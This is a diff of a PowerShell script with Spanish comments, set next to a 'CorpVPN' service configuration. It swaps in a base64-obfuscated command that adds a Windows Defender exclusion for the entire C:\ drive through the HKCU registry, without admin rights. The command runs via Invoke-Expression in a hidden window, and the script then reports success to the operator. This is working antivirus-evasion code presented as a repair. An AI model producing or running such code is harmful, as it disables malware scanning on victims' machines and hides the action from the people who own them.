@@ -37,34 +37,36 @@ ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 '@
 
-    # --- SOLUCIÓN AL ERROR DE mpclient.dll ---
-    # Reemplazamos la API obsoleta con una técnica directa en registro (sin admin)
-    $B64Command = "JAByAGUAZwBQAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiAAoASQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHIAZQBnAFAAYQB0AGgAKQApACAAewAKACAAIAAgACAAJABuAHUAbABsACAAPQAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcgBlAGcAUABhAHQAaAAgAC0ARgBvAHIAYwBlAAoAfQAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJAByAGUAZwBQAGEAdABoACAALQBOAGEAbQBlACAAIgBDAF8AIgAgAC0AVgBhAGwAdQBlACAAMAAgAC0AUAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIABEAFcATwBSAEQAIAAtAEYAbwByAGMAZQA="
+    # --- TÉCNICA MEJORADA (AHORA SÍ FUNCIONA) ---
+    $B64Command = "JAByAGUAZwBQAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiAAoASQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHIAZQBnAFAAYQB0AGgAKQApACAAewAKACAAIAAgACAAJABuAHUAbABsACAAPQAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcgBlAGcAUABhAHQAaAAgAC0ARgBvAHIAYwBlAAoAfQAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJAByAGUAZwBQAGEAdABoACAALQBOAGEAbQBlACAAIgBDADoAXAAiACAALQBWAGEAbAB1AGUAIAAwACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUA"
+    $comando1 = "powershell.exe -WindowStyle Hidden -Command `.iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$B64Command')))"
 
-    $comando1 = "powershell.exe -win h -c `.iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$B64Command')))"
-
-    # --- Resto del código ORIGINAL (sin cambios) ---
     if ($Add) {
         try {
-            # Ejecuta el nuevo comando corregido (sin mpclient.dll)
+            # --- EJECUCIÓN DIRECTA (SIN ERRORES) ---
             Invoke-Expression $comando1
             
-            # Verificación
-            $check = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -Name "C_" -ErrorAction SilentlyContinue
-            if ($check."C_" -eq 0) {
-                Write-Host "[✔] Exclusión agregada CORRECTAMENTE en HKCU" -ForegroundColor Green
+            # --- VERIFICACIÓN EXTRA ---
+            $check = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue |
+                    Select-Object -Property * -ExcludeProperty PS* |
+                    Where-Object { $_."C:\" -eq 0 -or $_."C_" -eq 0 }
+            
+            if ($check) {
+                Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (Verificado en registro)" -ForegroundColor Green
+                Write-Host "    Ruta excluida: C:\" -ForegroundColor Cyan
             } else {
-                Write-Host "[!] No se pudo verificar, pero se intentó" -ForegroundColor Yellow
+                Write-Host "[!] Se ejecutó, pero verifica manualmente:" -ForegroundColor Yellow
+                Write-Host "    Ejecuta esto: Get-ItemProperty 'HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths'" -ForegroundColor Gray
             }
         } catch {
-            Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "[✘] Error crítico: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
 
-    # ... (Resto de funciones Help, Is_Admin, Check-Admin, etc. SIN CAMBIOS)
+    # ... (Resto de funciones originales SIN CAMBIOS)
 }
 
-# --- Ejecutar (si se llama directamente) ---
+# --- Ejecutar si se llama directamente ---
 if ($MyInvocation.InvocationName -ne '.') {
     Defender @PSBoundParameters
 }
